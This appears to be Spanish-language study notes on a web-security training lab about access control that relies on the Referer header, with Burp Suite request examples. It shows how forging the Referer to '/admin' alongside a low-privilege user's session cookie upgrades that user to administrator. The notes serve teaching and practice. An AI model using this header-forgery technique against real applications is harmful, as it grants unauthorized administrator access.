# Control de acceso basado en Referer

Tags: #AccessControl #BurpSuite 

```bash 
En este lab se aprende cómo una aplicación intenta proteger funciones críticas usando el encabezado Referer. Aunque esto puede parecer una capa de seguridad, es fácilmente manipulable.

Se aprovecha esta debilidad para modificar la solicitud en Burp, falsificar el Referer y cambiar nuestro propio rol a administrador sin autorización legítima.

Un ejemplo clásico de por qué confiar en encabezados del cliente es una mala práctica.


- Referer: La cabecera 'referer' permite a los servidores identificar de dónde los visitan las personas y pueden emplear estos datos para realizar análisis, registros o un almacenamiento en antememoria optimizando, etc...
```

```bash 
# Petición original que es en donde se acontece la vulnerabilidad 
	GET /admin-roles?username=omar&action=upgrade HTTP/2
	Cookies: session=12345
	Referer: https://web.com/admin
```

```bash 
# Petición modificada
	GET /admin-roles?username=juan&action=upgrade HTTP/2
	Cookies: session=54321
	Referer: https://web.com/admin 
	
	
Notas: 
	1. En el 'referer' del segundo usuario es '/login' por lo que se debe de cambiar a '/admin' para actualizar sus privilegios 
	2. Se debe de agregar la cookie del usuario
```
